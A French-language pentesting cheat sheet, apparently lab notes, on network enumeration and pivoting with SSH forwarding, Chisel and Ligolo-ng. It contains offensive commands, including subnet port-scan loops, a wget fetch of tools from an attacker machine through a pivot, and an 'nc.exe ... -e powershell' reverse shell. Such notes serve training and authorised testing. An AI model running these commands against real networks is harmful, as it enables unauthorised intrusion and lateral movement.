
# Enumération

```
arp -a
ip addr
ip route
ss -ntplu 
netstat -ant
```

```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

1..254 | ForEach-Object { $ip = "192.168.1.$_"; if (Test-NetConnection -ComputerName $ip -Port 445 -InformationLevel Quiet) { "$ip : Port 445 ouvert" } }

# Boucle bash et powershell pour recherche d'hôtes avec un port 445 ouvert sur sous-réseau /24
```


# SSH

## Redirection de port local

```
ssh -L 8080:10.10.10.10:80 user@server.com
```

```
# les connexions vers "localhost:8080" sont redirigées vers "10.10.10.10:80" via le serveur SSH "server.com"
```

Utilisation :
- Accéder à une interface web ou à une base de données sur un réseau privé.
- Contourner des restrictions de réseau en accédant à des services internes via une machine intermédiaire.

## Redirection de port distant

```
ssh -R 8080:localhost:80 user@server.com
```

```
# les connexions vers "server.com:8080" sont redirigées vers "localhost:80" sur la machine locale.
```

Utilisation :
- Possible d'effectuer des reverse-shell (attention: il faut utiliser l'adresse local du pivot à partir de la cible)
- Accéder à un service interne depuis un réseau externe.

## Redirection de port dynamique

```
ssh -D 50080 user@server.com

┌──(kali㉿kali)-[~]
└─$ tail /etc/proxychains4.conf
#
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5	127.0.0.1 50080
```

```
# un proxy SOCKS est mis en place sur localhost:1080
```

Utilisation :
- Avoir accès à tous le sous-réseau de la machine pivot

## Scénarios combinés

```
ssh -R 2222:localhost:22 -D 1080 user@server.com
```

**Exemple** :

Machine attaque : 192.168.1.1
Machine pivot : 192.168.1.2 - 10.10.1.2
Machine cible : 10.10.1.3

```
ssh -R 8888:localhost:80 -D 50080 user@192.168.1.2
```

La machine attaquante a maintenant accès à tous le réseau 10.10.1.*

Si je peux exécuter des commande sur la machine cible, je peux télécharger des fichiers provenant de machine attaquante (port 80) :

```
wget http://10.10.1.2:8888/tools/exemple.exe 
```

Idem pour obtenir un reverse-shell.

# Chisel

Note : si on inverse les rôles de serveur et de client, les redirections locales et distantes seront également inversés.

## Redirection de port local

```
# Machine attaquante :
./chisel server --port 8888
# Machine cible :
./chisel client 192.168.45.237:8888 5000:127.0.0.1:80
```

```
# En recherchant 127.0.0.1:5000 nous avons accès au port 80 de la cible
```

## Redirection de port distant

```
# Machine attaquante :
./chisel server --port 8888 --reverse
# Machine cible :
./chisel client 192.168.45.237:8888 R:5000:127.0.0.1:80
```
## Obtenir un reverse-shell

```
# Machine pivot :
./chisel server -p 9999 --reverse
# Machine attaquante :
./chisel client 10.129.183.163:9999 R:4445:localhost:4444
# Machine cible (sous-réseau de mon pivot):
nc.exe 172.16.1.5 4445 -e powershell
```

```
Inverser rôle client/server d'une redirection locale
```
## Redirection socks5

```
# Machine pivot :
chisel.exe server --port 7777 --socks5 
# Machine kali :
chisel client 192.168.14.12:7777 50080:socks
# tail /etc/proxychains4.conf
socks5 127.0.0.1 50080
```

```
# Permet d'avoir accès à tout le sous-réseau de la machine cible
```

# Ligolo-ng

## Installation

```
https://github.com/nicocha30/ligolo-ng/releases
```

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ifconfig

# ligolo: flags=4241<UP,POINTOPOINT,NOARP,MULTICAST>  mtu 1500
#        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
```

Dès que fini :
```
sudo ip link delete ligolo
```

## Utilisation

```
# Machine attaquante
./proxy -selfcert
# Machine cible
agent.exe -connect 192.168.49.115:11601 -ignore-cert
```

## Démarrer Tunnel

```
ligolo-ng » session
ligolo-ng » session 0
ligolo-ng » start
```

## Ajouter route

```
sudo ip route add 10.10.150.0/24 dev ligolo
ip route show
```

